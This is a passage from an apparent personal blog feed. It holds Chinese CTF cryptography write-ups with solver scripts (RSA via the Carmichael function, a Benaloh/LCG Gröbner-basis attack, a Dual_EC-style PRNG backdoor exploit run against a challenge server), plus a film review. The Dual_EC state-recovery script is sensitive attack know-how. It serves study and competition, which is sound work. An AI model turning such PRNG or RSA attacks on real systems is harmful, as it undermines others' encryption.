class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">0x99efa9177387907eb3f74dc09a4d7a93abf6ceb7ee102c689ecd0998975cede29f3ca951feb5adfb9282879cc666e22dcafc07d7f89d762b9ad5532042c79060cdb022703d790421a7f6a76a50cceb635ad1b5d78510adf8c6ff9645a1b179e965358e10fe3dd5f82744773360270b6fa62d972d196a810e152f1285e0b8b26f5d54991d0539a13e655d752bd71963f822affc7a03e946cea2c4ef65bf94706f20b79d672e64e8faac45172c4130bfeca9bef71ed8c0c9e2aa0a1d6d47239960f90ef25b337255bac9c452cb019a44115b0437726a9adef10a028f1e1263c97c14a1d7cd58a8994832e764ffbfcc05ec8ed3269bb0569278eea0550548b552b1</span></span><br><span class="line">ct = <span class="number">0x339be515121dab503106cd190897382149e032a76a1ca0eec74f2c8c74560b00dffc0ad65ee4df4f47b2c9810d93e8579517692268c821c6724946438a9744a2a95510d529f0e0195a2660abd057d3f6a59df3a1c9a116f76d53900e2a715dfe5525228e832c02fd07b8dac0d488cca269e0dbb74047cf7a5e64a06a443f7d580ee28c5d41d5ede3604825eba31985e96575df2bcc2fefd0c77f2033c04008be9746a0935338434c16d5a68d1338eabdcf0170ac19a27ec832bf0a353934570abd48b1fe31bc9a4bb99428d1fbab726b284aec27522efb9527ddce1106ba6a480c65f9332c5b2a3c727a2cca6d6951b09c7c28ed0474fdc6a945076524877680</span></span><br><span class="line">h = <span class="number">2</span>**<span class="number">1025</span> - <span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">r&#x27;http://factordb.com/api&#x27;</span>, params=&#123;<span class="string">&quot;query&quot;</span>: <span class="built_in">str</span>(h + <span class="number">1</span>)&#125;)</span><br><span class="line"></span><br><span class="line">primes = [<span class="built_in">int</span>(_[<span class="number">0</span>]) <span class="keyword">for</span> _ <span class="keyword">in</span> response.json().get(<span class="string">&quot;factors&quot;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> prod(primes) == h + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">cands = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">2</span>**<span class="built_in">len</span>(primes))):</span><br><span class="line">    tmp = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(primes)):</span><br><span class="line">        <span class="keyword">if</span> k % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            tmp *= primes[i]</span><br><span class="line">        k //= <span class="number">2</span></span><br><span class="line">    tmp += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> is_prime(tmp):</span><br><span class="line">        cands.append(tmp)</span><br><span class="line"></span><br><span class="line"><span class="comment"># check</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="built_in">len</span>(cands))):</span><br><span class="line">    tmp_p = cands[i]</span><br><span class="line">    <span class="keyword">assert</span> is_prime(tmp_p)</span><br><span class="line">    <span class="keyword">assert</span> (h + <span class="number">1</span>) % (tmp_p - <span class="number">1</span>) == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">L = prod(cands)</span><br><span class="line">d = <span class="built_in">int</span>(<span class="built_in">pow</span>(e, -<span class="number">1</span>, L))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(ct, d, n))))</span><br></pre></td></tr></table></figure><h1 id="benaloh">benaloh</h1><p>public key cryptosystems， which is homomorphic.</p><h2 id="key-generation">Key Generation</h2><p>Given block size <em>r</em>, a public/private key pair is generatedas follows:</p><ol type="1"><li><p>Choose large primes <em>p</em> and <em>q</em> such that <em>r |(p-1)</em>, <em>gcd(r, (p-1)/r) = 1</em>, and <em>gcd (r,(q - 1)) =1</em>;</p></li><li><p>set <span class="math display">\[n = pq,  \phi =(p-1)(q-1)\]</span></p></li><li><p><span class="math display">\[ choose y \in Z{^*_n}\quadsuch\;that\;y^{\phi/r} \not\equiv1\;mod\;n\]</span></p><p><strong>Note:</strong> If <em>r</em> is composite, it was pointed outby Fousse et al. in 2011that the above conditions (i.e., those stated inthe original paper) are insufficient to guarantee correctdecryption</p></li><li><p>Set <span class="math display">\[x\;=\;y^{\phi/r}\;mod\;n\]</span></p><p>The public key is then <span class="math display">\[{\displaystyley,n}\]</span>, and the private key is <span class="math display">\[{\displaystyle \phi ,x}\]</span></p></li></ol><h2 id="message-encryption">Message Encryption</h2><p>To encrypt message <span class="math display">\[ m\inZ_r\]</span>:</p><ol type="1"><li>Choose a random <span class="math display">\[u \in Z{_n^*}\]</span>;</li><li>set <span class="math display">\[E_r(m) = y^mu^r\;mod\;n\]</span></li></ol><h2 id="message-decryption">Message Decryption</h2><p>To decrypt message <span class="math display">\[ c\inZ{_n^*}\]</span>:</p><ol type="1"><li>comupte <span class="math display">\[a = c ^{\phi/r} \;modn\]</span></li><li>output <span class="math display">\[m = log_x(a)\]</span>, i.e.,findm such that <span class="math display">\[x^m \;\equiv1 \; modn\]</span></li></ol><p>Baby-step giant-step algorithm can be used to recover m in <span class="math display">\[O(\sqrt{r})\]</span> time and space</p><p>题里u是用lcg依次生成的，每四位对明文进行加密。我们可以知道前几组mask的值，所以相当于有4组（更多约出来也是这样的）三元方程。为了更好的求根，这里使用<span class="math display">\[GrÖbner\]</span>基，找到一组多项式理想的约化。求出的<span class="math display">\[GrÖbner\]</span>基有以下形式： <span class="math display">\[c^{17} + B_0 = 0\\u + B_1*c=0\\a + B_2=0\]</span> 又由lcg的推导有： <span class="math display">\[x_{i+1}=ax_i+c=-B_2x_i+c=...=C_{i+1}c\\所以x{_{i}^{17}}=(C_ic)^{17}=C{_i^{17}}c^{17}=C{_i^{17}}(-B_0)\\而C_i已知，因此可求解\]</span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">r = <span class="number">17</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">n, y = <span class="built_in">eval</span>(f.readline())</span><br><span class="line">R = Integers(n)</span><br><span class="line">z = <span class="built_in">list</span>(<span class="built_in">map</span>(R, f.readlines()))</span><br><span class="line"></span><br><span class="line">y = R(y)</span><br><span class="line">log = &#123;y^i: <span class="string">&#x27;&#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r)&#125;</span><br><span class="line"></span><br><span class="line">P.&lt;u, a, c&gt; = PolynomialRing(R)</span><br><span class="line"></span><br><span class="line">G = []</span><br><span class="line">f = u</span><br><span class="line"><span class="keyword">for</span> i, m <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="string">b&#x27;di&#x27;</span>.<span class="built_in">hex</span>()):</span><br><span class="line">G.append(f^r - z[i]/y^<span class="built_in">int</span>(m, <span class="number">16</span>))</span><br><span class="line">f = a*f + c</span><br><span class="line"></span><br><span class="line">B = Ideal(G).groebner_basis()</span><br><span class="line"><span class="built_in">print</span>(B)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">f = -B[<span class="number">1</span>].monomial_coefficient(c)*c</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(z)):</span><br><span class="line">flag += log[z[i]/(f.monomial_coefficient(c)^r*(-B[<span class="number">0</span>].constant_coefficient()))]</span><br><span class="line">f = -B[<span class="number">2</span>].constant_coefficient()*f + c</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(flag))</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;做题&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://sh1k4ku.github.io/categories/CTF/"/>
    
    
    <category term="RSA" scheme="http://sh1k4ku.github.io/tags/RSA/"/>
    
    <category term="Carmichael function" scheme="http://sh1k4ku.github.io/tags/Carmichael-function/"/>
    
  </entry>
  
  <entry>
    <title>分区赛</title>
    <link href="http://sh1k4ku.github.io/2022/06/27/2022/%E5%88%86%E5%8C%BA%E8%B5%9B/"/>
    <id>http://sh1k4ku.github.io/2022/06/27/2022/%E5%88%86%E5%8C%BA%E8%B5%9B/</id>
    <published>2022-06-26T16:00:00.000Z</published>
    <updated>2022-06-28T08:43:26.601Z</updated>
    
    <content type="html"><![CDATA[<p>题不难，要查找信息and稳住心态</p><span id="more"></span><h1 id="dual">dual</h1><p>前一部分是要用xy求椭圆曲线的生成参数；</p><p>后一部分是NSA的后门，是一个随机数发生器，用一系列貌似随机的数和椭圆上的点做乘积，最后输出低240位作为每一轮的结果。因为P,Q是固定的，椭圆曲线的参数也是固定的，P、Q之间必然存在一个线性关系，那么就用这个线性关系去预测下一次的结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from sys import stdout</span><br><span class="line">from fastecdsa.curve import P256</span><br><span class="line">from fastecdsa.point import Point</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from tqdm import trange</span><br><span class="line"></span><br><span class="line">VERBOSE = True</span><br><span class="line"></span><br><span class="line">G = P256.G</span><br><span class="line"></span><br><span class="line">def pad(s):</span><br><span class="line">    return s + (16 - len(s) % 16) * b&quot;\x00&quot;</span><br><span class="line"></span><br><span class="line">class PRNG:</span><br><span class="line">    def __init__(self, e, seed):</span><br><span class="line">        self.state = seed</span><br><span class="line">        self.Q = e * G</span><br><span class="line">        self.P = G</span><br><span class="line">        self.mask = 2**240 - 1</span><br><span class="line">        </span><br><span class="line">    def gen(self):</span><br><span class="line">        new_point = self.state * self.P</span><br><span class="line">        r = new_point.x</span><br><span class="line">        self.state = r</span><br><span class="line">        ret = r * self.Q</span><br><span class="line">        return ret.x &amp; self.mask</span><br><span class="line"></span><br><span class="line">def p256_mod_sqrt(c):</span><br><span class="line">    p = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff</span><br><span class="line">    t1 = pow(c, 2, p)</span><br><span class="line">    t1 = (t1 * c) % p</span><br><span class="line">    t2 = pow(t1, 2**2, p)</span><br><span class="line">    t2 = (t2 * t1) % p</span><br><span class="line">    t3 = pow(t2, 2**4, p)</span><br><span class="line">    t3 = (t3 * t2) % p</span><br><span class="line">    t4 = pow(t3, 2**8, p)</span><br><span class="line">    t4 = (t4 * t3) % p</span><br><span class="line">    r = pow(t4, 2**16, p)</span><br><span class="line">    r = (r * t4) % p</span><br><span class="line">    r = pow(r, 2**32, p)</span><br><span class="line">    r = (r * c) % p</span><br><span class="line">    r = pow(r, 2**96, p)</span><br><span class="line">    r = (r * c) % p</span><br><span class="line">    return pow(r, 2**94, p)</span><br><span class="line"></span><br><span class="line">def find_point_on_p256(x):</span><br><span class="line">    # equation: y^2 = x^3-ax+b</span><br><span class="line">    y2 = (x * x * x) - (3 * x) + P256.b</span><br><span class="line">    y2 = y2 % P256.p</span><br><span class="line">    y = p256_mod_sqrt(y2)</span><br><span class="line">    return y2 == (y * y) % P256.p, y</span><br><span class="line"></span><br><span class="line">class Solve:</span><br><span class="line">    def __init__(self) -&gt; None:</span><br><span class="line">        self.conn = remote(&#x27;192.168.0.64&#x27;, 58010)</span><br><span class="line">        self.n = 15</span><br><span class="line">    </span><br><span class="line">    def s_3(self):</span><br><span class="line">        self.conn.sendlineafter(&#x27;&gt;&#x27;, &#x27;3&#x27;)</span><br><span class="line">        </span><br><span class="line">        x0 = eval(self.conn.recvline())</span><br><span class="line">        x = eval(self.conn.recvline())</span><br><span class="line">        y = eval(self.conn.recvline())</span><br><span class="line">        x1 = x[:self.n]</span><br><span class="line">        x2 = x[self.n:]</span><br><span class="line">        p_list = []</span><br><span class="line">        PR = PolynomialRing(Zmod(x0), &#x27;x&#x27;)</span><br><span class="line">        x_ = PR.gen()</span><br><span class="line">        f = x_ + y</span><br><span class="line">        sol = f.small_roots(X=2**20, beta=1./20)</span><br><span class="line">        p_list = [ZZ(gcd(t + y, x0)) for t in sol]</span><br><span class="line">        print(len(p_list))</span><br><span class="line">        e = min(p_list)</span><br><span class="line">        # print(set(p0) == set(p_list))</span><br><span class="line">        return e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def gen_prediction(self, observed, Q, d):</span><br><span class="line">        ret = []</span><br><span class="line">        for high_bits in trange(2**15): # 2**16: have sol, 2**15: 1/2 prob</span><br><span class="line">            guess = (high_bits &lt;&lt; (8 * 30)) | observed</span><br><span class="line">            on_curve, y = find_point_on_p256(guess)</span><br><span class="line"></span><br><span class="line">            if on_curve:</span><br><span class="line">                # use the backdoor to guess the next 30 bytes</span><br><span class="line">                point = Point(guess, y, curve=P256)</span><br><span class="line">                s = (d * point).x</span><br><span class="line">                r = (s * Q).x &amp; (2**(8 * 30) - 1)</span><br><span class="line">                ret.append(r)</span><br><span class="line"></span><br><span class="line">        return ret</span><br><span class="line"></span><br><span class="line">    def s_pred(self, e):</span><br><span class="line">        d = int(inverse(e, P256.q))</span><br><span class="line">        Q = e * G</span><br><span class="line">        self.conn.sendlineafter(&#x27;&gt;&#x27;, &#x27;1&#x27;)</span><br><span class="line">        observed = eval(self.conn.recvline())</span><br><span class="line">        # print(guess)</span><br><span class="line">        # pred = eval(self.conn.recvline())</span><br><span class="line">        # print(pred)</span><br><span class="line">        predicted = self.gen_prediction(observed, Q, d)</span><br><span class="line">        # print(len(predicted))</span><br><span class="line">        # print(pred in predicted)</span><br><span class="line">        </span><br><span class="line">        return predicted</span><br><span class="line">    </span><br><span class="line">    def s_2(self, pred):</span><br><span class="line">        self.conn.sendlineafter(&#x27;&gt;&#x27;, &#x27;2&#x27;)</span><br><span class="line">        self.conn.recvuntil(&#x27;ct: &#x27;)</span><br><span class="line">        ct = self.conn.recvline().strip()</span><br><span class="line">        ct = base64.b64decode(ct)</span><br><span class="line">        for nx in pred:</span><br><span class="line">            key = pad(long_to_bytes(nx))</span><br><span class="line">            cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">            pt = cipher.decrypt(ct)</span><br><span class="line">            if (all(64 &lt; x &lt; 128 for x in pt)):</span><br><span class="line">                print(pt)</span><br><span class="line">                self.conn.sendlineafter(&#x27;pt:&#x27;, base64.b64encode(pt))</span><br><span class="line">                self.conn.interactive()</span><br><span class="line">                return True</span><br><span class="line">        else:</span><br><span class="line">            self.conn.close()</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def s(self):</span><br><span class="line">        e = int(self.s_3())</span><br><span class="line">        pred = self.s_pred(e)</span><br><span class="line">        if (pred == 0):</span><br><span class="line">            self.conn.close()</span><br><span class="line">            return False</span><br><span class="line">        is_success = self.s_2(pred)</span><br><span class="line">        return is_success</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    while True:</span><br><span class="line">        print(&#x27;Begin try...&#x27;)</span><br><span class="line">        s = Solve()</span><br><span class="line">        is_success = s.s()</span><br><span class="line">        if (is_success):</span><br><span class="line">            break</span><br><span class="line">        print(&#x27;Failed&#x27;)</span><br></pre></td></tr></table></figure><p>因为环境问题最后在队友电脑上出的--</p><h1 id="rsa">RSA</h1><p>送分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">lcm = <span class="number">4292158730589770192682795435047249488185453170529228019750042608688907718268448193363838203887391025871515871000364259326343790645215256385842265899206372365402431198699714374850409466996627163968391249416054093529090485677808301343590811445080871279796162536469847469761747058736980603093722710824453312207182881241846080117790728778291633761198069016865260030288832065807438020772711645648333908622890343009942617559434851450007195025869850769670769715654662127278293639938359741401336592219730356884542179574372134014927006215640945952229142436595334916765255426954857520777553915330597952622785359222832224632624</span></span><br><span class="line">c = <span class="number">4288727484183191191687364666620023549392656794153112764357730676861570386983002380982803054964588111708662498647767438881892355599604826306427809017097724346976778230464708540600157055782723189971534549543664668430013171469625043063261219462210251726207552819381767396148632877168530609902046293626355744288863460554297860696918890189350721960355460410677203131993419723440382095665713164422367291153108363066159712951217816814873413423853338021627653555202253351957999686659021298525147460016557904084617528199284448056532965033560516083489693334373695545423561715471204868795248569806148395196572046378679014697206</span></span><br><span class="line">N  = <span class="number">17168634922359080770731181740188997952741812682116912079000170434755630873073792773455352815549564103486063484001457037305375162580861025543369063596825489461609724794798857499401637867986508655873564997664216374116361942711233205374363245780323485119184650145879389879046988234947922412374890843297813248828996855478005656041814919367820336728271583686844991928889831691815821365423570311291064846736832327637944358854661523107817781673029406341843040857813841671405147146887291204140157388049394514390098066284975682117038362207142272098796924412602725857521665773622056312191400612944442008222587867782281556388669</span></span><br><span class="line">E = <span class="number">65537</span></span><br><span class="line">d = gmpy2.invert(E, lcm)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span> + md5(long_to_bytes(<span class="built_in">pow</span>(c,d,N))).hexdigest() + <span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;题不难，要查找信息and稳住心态&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://sh1k4ku.github.io/categories/CTF/"/>
    
    
    <category term="ECC" scheme="http://sh1k4ku.github.io/tags/ECC/"/>
    
    <category term="RSA" scheme="http://sh1k4ku.github.io/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>《一秒钟》观后感</title>
    <link href="http://sh1k4ku.github.io/2022/05/17/2022/%E3%80%8A%E4%B8%80%E7%A7%92%E9%92%9F%E3%80%8B%E8%A7%82%E5%90%8E%E6%84%9F/"/>
    <id>http://sh1k4ku.github.io/2022/05/17/2022/%E3%80%8A%E4%B8%80%E7%A7%92%E9%92%9F%E3%80%8B%E8%A7%82%E5%90%8E%E6%84%9F/</id>
    <published>2022-05-17T13:53:52.000Z</published>
    <updated>2022-05-17T14:45:42.750Z</updated>
    
    <content type="html"><![CDATA[<p>影视鉴赏的最后一节课，老师给放了张艺谋导演的一秒钟，由于这次不再布置作业，也没有当作考试，所以就自己记录一下观后感吧，是一部很优秀的作品，内容也很丰富，回去后凭着记忆随便记点东西<span id="more"></span></p><p>《一秒钟》是张艺谋本人拍摄的电影，并且他全程使用胶片拍摄，表达了他在这个数字化时代对胶片的热爱和坚持。电影的背景是文革时代的大西北，整个电影给了茫茫黄土大量的镜头，展示这种自然景观。电影通过看电影展开（套娃，有意思的是里面的电影也是用胶片播放的，有一段剧情是胶片被破坏后，人们用布将胶片抬起来，就像抬棺一样，这也仿佛是胶片电影的结局；而女主所唱的ed，歌词也是在映射胶片，可以理解成胶片的挽歌。电影里还给了胶片很多特写，可以看出张艺谋真的很喜欢胶片。可惜，数字化是时代的潮流，任何事物、甚至是阶级、国家，都挡不住时代潮流。</p><p>电影里最核心的还是男女主，男主是一名劳改犯，从劳改农场逃出来看电影只为见自己的女儿，尽管在影片中只出现了“一秒钟”，这也是标题的来源；女主和她的弟弟是孤儿，所以起名也很简单，为了偷胶片来赔偿别人的“胶片灯罩”，虽然她的父亲对姐弟俩很差，并且据她本人说“早就死了”，但她仍然很想念自己的父亲，渴望父爱。于是，男主寻找女儿，女主寻找父亲，这一对巧合就这样碰撞在一起了。在电影最后，文革结束高考恢复，男主也被劳改所放出来，于是他来到二场（看电影的地方之一）；女主也长大成人，从一个不谙世事的女孩转变为成熟的大人，他们二人一起去沙漠里寻找之前被丢弃的男主女儿的胶片，电影结束。</p><p>在整个故事中，可以看出男主是一个不善言辞的人，易怒、好斗，所以在当时那个时代被人陷害，仅因打架劳改多年，也因此妻离子散，无法与他的女儿相见。尽管女主反复偷窃胶片，但她确实不是坏人——因为弟弟弄坏了别人的胶片台灯，又因为胶片是买不到的，只能去偷，而弟弟也因为邻居小孩的欺凌不敢出门。在这样一个敏感的时代，仿佛每个人的遭遇都充满了不幸，但是从整体上来看，又充满了希望。放映员号召大家一起清洗胶片时，每个人都充满了干劲，以此为己任，全然体现集体主义的美好。《三体1》中，叶文洁的家庭因批斗遭遇不幸，但她住在东北乡村的那段时间全然忘记了生活的苦闷。尽管如此，信号已经发出，过去的事已无法挽回。或许，这便是时代的悲哀吧。</p><p>电影里还有一位刻画的非常饱满的人物，就是放映员。在他的行为举止中，很能看出那个时代里小人物的悲剧。对村民来说，他是高高在上的放映员，表面上呼风唤雨；作为小领导，他害怕自己的职位被他人，不断贬低想要接替他位置的人；同时，他对保卫科的头却点头哈腰（个人理解保卫科的头官位比他大），在他叫保卫科去抓捕男主时不忘祈求对方为自己记上一功。同时，得知男主是劳改犯身份的前后，他的态度大相径庭；而从另一方面，他对自己的工作非常负责，懂得各种技巧，所谓“四个场唯独他会拉长胶片”；最后，这样一位呼风唤雨的大人物，却也有自己的不幸：之所以他的儿子不是接班人，因为他儿子小时错将胶片的清洗液当水喝下，而他因疏忽使儿子烧坏了脑子，只能放牛。而在揭发了男主后，他为保卫科殴打了他感到自责，于是将他女儿的那两篇胶带送给了他，男主也请求他把那个胶片灯罩送给女主，从后来可以看到他确实这么做。1个人认为这个角色是刻画的最细腻的一位。</p><p>最后这段也反映了当时对人权的漠视。男主在被保卫科抓走后，他们抢走了男主女儿的胶片，还扔掉了。面对男主撕心的呼喊，他们做的却只是嘲笑。</p><p>电影还有很多丰富的内容，但是俺可能给忘了qwq，就到此为止吧。这门课确实教给了我很多，有机会的话还想再学一些看电影的方法论。其实自己也知道这是假的，这辈子大概是再也不会去学了，这就像去年的中华文化一般，尽管我知道自己再也不会去看了，但还是想记录下现在的感想。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;影视鉴赏的最后一节课，老师给放了张艺谋导演的一秒钟，由于这次不再布置作业，也没有当作考试，所以就自己记录一下观后感吧，是一部很优秀的作品，内容也很丰富，回去后凭着记忆随便记点东西&lt;/p&gt;</summary>
    
    
    
    <category term="movie" scheme="http://sh1k4ku.github.io/categories/movie/"/>
    
    
  </entry>
  
  <entry>
    <title>SM2</title>
    <link href="http://sh1k4ku.github.io/2022/03/14/2022/SM2/"/>
    <id>http://sh1k4ku.github.io/2022/03/14/2022/SM2/</id>
    <published>2022-03-14T07:03:44.000Z</published>
    <updated>2022-03-14T07:06:04.555Z</updated>
    
    <content type="html"><![CDATA[<p>大创撸了个sm2（水一下博客</p><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span 